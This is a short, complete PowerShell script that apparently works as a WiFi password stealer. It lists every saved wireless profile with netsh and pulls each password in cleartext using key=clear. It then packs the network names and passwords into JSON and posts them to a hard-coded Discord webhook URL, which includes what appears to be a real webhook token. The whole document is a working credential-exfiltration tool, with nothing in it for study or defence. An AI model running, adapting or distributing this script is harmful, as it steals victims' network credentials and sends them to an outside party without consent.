$WebhookUrl = "https://discord.com/api/webhooks/1526592454168416286/85IrB-28a1gF4qRZOceA2tQNWpPEHa7KmBLUMSPVC0VENE6W7P1jsENuvZoepNtkARJB"

Write-Host "Getting WiFi"

$profiles = netsh wlan show profiles | 
    Select-String "\s*:\s*(.*)$" | 
    ForEach-Object { $_.Matches.Groups[1].Value.Trim() } | 
    Where-Object { $_ -ne "" -and $_ -notmatch "All User Profile" }

$wifiList = foreach ($profile in $profiles) {
    $profileDetails = netsh wlan show profile name="$profile" key=clear
    
    $password = $profileDetails | 
                Select-String "Key Content\s*:\s*(.*)$" | 
                ForEach-Object { $_.Matches.Groups[1].Value.Trim() }

    if (-not $password) { $password = "[None or Open Network]" }

    [PSCustomObject]@{
        SSID     = $profile
        Password = $password
    }
}

# Fix: Discord requires a valid JSON object with "content" key at the top level
$Payload = @{
    content = ($wifiList | ConvertTo-Json)
} | ConvertTo-Json

Write-Host "Sending to webhook"

try {
    $Response = Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType "application/json"
}
catch {
    Write-Host "Exception:"
    Write-Host $_.Exception.Message

    if ($_.ErrorDetails.Message) {
        Write-Host "Response:"
        Write-Host $_.ErrorDetails.Message
    }
}

Write-Host "done."
